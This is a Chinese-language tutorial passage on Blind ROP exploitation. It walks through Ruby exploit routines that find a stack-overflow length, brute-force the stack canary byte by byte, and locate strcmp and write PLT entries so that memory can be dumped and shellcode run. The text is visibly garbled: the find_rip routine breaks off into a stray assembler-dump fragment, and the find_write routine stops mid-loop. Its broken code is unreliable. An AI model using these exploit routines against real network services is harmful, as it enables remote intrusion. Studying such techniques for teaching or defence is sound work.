ROP其实核心部分都是类似于爆破的概念，因此会不断的引起目标服务崩溃，挂起，如果崩溃后不能重新启动，且启动后Canary或者其他地址改变，那么之前的爆破也就无意义了。那么Blind
ROP每一步在做什么呢。
爆破Canary
获取Hang addr和PLT
找到BROP gadget
找到strcmp plt和write plt
Dump内存，执行shellcode
Blind
ROP由于不知道目标环境，因此，我们就用write(socket,buf,size)的方法，dump出内存，从而获取gadget最后形成一个可用的ROP
gadget，后面就是我们常规Attack的方法了，因此，在这之前，才是Blind ROP的核心，下面，我们就从Exploit入手，来分解这个核心过程。
首先，我们发现了一个栈溢出，需要找到这个栈溢出的准确位置，因为我们没有获取目标服务的elf，因此就用探测的方法来获取到溢出的长度，也就是刚刚崩溃的位置。
    def find_overflow_len()#测试溢出长度，olen是实例变量
    ws = 8
    olen = ws #长度为8，前面4096已有
    while true
    stuff = "A" * olen 填充8个字节
    r = try_exp_print(olen, stuff)#尝试溢出
    break if r == RC_CRASH #崩溃了，就返回
    olen += ws #否则尝试再加8字节长度
    end
    abort("unreliable") if olen == ws 
    olen -= ws
    while true #判断olen准确溢出长度
    stuff = "A" * olen
    r = try_exp_print(olen, stuff)
    break if r == RC_CRASH
    olen += 1
    end
    olen -= 1
    @olen = olen
    print("nFound overflow len #{olen}n")#实例变量赋值，打印长度
    end
4096已经定义好了，其实我们也可以从0开始，olen是一个实例变量，标记4096后的崩溃长度。最后可以获取到溢出的长度。
当我们获取到崩溃长度后，根据Canary->EBP->Ret的栈结构，我们可以开始爆破Canary，爆破的方法就是一字节一字节爆破。
这样，当我们第一字节从00开始爆破，当爆破到正确Canary的字节的时候，就不会崩溃，这时候再对第二字节进行爆破，以此类推。爆破出正确的Canary。
    def find_rip()
    words = []
    while true #进入循环
    stuff = "A" * @olen
    stuff :pop    r15
       0x000000000040706b :ret    
    End of assembler dump.
这一步完成后，我们就需要进行strcmp和write对应plt项的查找了，为什么要找strcmp呢，因为strcmp的汇编功能是对rdx赋予一个长度值，通过这种方法可以对rdx，也就是第三个参数赋值，因为在.text字段中很难找到pop
rdx,ret这样的gadget。
找这两个plt项，需要利用这两个plt项的特性，比如strcmp就是对比两个字符串内容。如果两个字符串相等，没有崩溃，且不相等，crash的话，这就是一个strcmp。
    def find_strcmp()
    entry = 0
            good = @rip
    while true
    rc = try_strcmp(entry, good) #对比两个字符串值
    if rc != false
    print("Found strcmp #{rc}n")
    @strcmp = rc
    @strcmp_addr = good
    break
    end
    entry += 1
    end
    End
    def do_try_strcmp(entry, good)
    bad1 = 300
    bad2 = 500
            return false if call_plt(entry, bad1, bad2) != false
            return false if call_plt(entry, good, bad2) != false
            return false if call_plt(entry, bad1, good) != false
            return false if call_plt(entry, good, good) != true
            return false if call_plt(entry, VSYSCALL + 0x1000 - 1, good) != true
            return true
    end
而write函数的plt项，就是利用多次写入socket，如果能打开多个文件描述符的话，就是write了。
    def find_write()
    entry = 0
    find_plt_start() if @small and not @plt_start
    get_banner_len()
    while entry 